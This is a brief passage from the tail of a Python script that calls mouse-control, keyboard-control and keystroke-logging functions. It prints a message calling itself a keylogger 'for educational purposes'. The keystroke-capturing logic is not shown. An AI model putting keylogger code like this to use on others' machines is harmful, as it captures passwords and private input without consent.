ith KeyboardListener(on_press=on_press) as listener:
        print("Listening to keyboard... (Press ESC to stop)")
        listener.join()  # Wait until the listener stops

# Call the functions
controlMouse()
controlKeyboard()
print("Starting keylogger (for educational purposes)...")
logKeystrokes()
